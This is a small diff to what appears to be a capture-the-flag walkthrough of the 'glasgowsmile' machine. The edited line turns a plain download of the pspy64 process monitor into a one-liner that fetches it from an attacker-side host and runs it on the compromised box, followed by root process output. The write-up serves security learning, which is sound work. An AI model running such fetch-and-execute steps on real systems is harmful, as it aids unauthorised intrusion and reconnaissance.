@@ -410,7 +410,7 @@ If you're gonna keep such large directory names, I'm going to feel like taking a
 `.trash_old` has interesting group permissions. But is it useful?
 
 ```shell
-penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ wget http://192.168.45.181/pspy64
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ wget http://192.168.45.181/pspy64 && chmod +x pspy64 && ./pspy64
 <...>
 2025/06/07 05:45:25 CMD: UID=0     PID=1380   | bash 
 2025/06/07 05:45:29 CMD: UID=0     PID=1381   | bash 
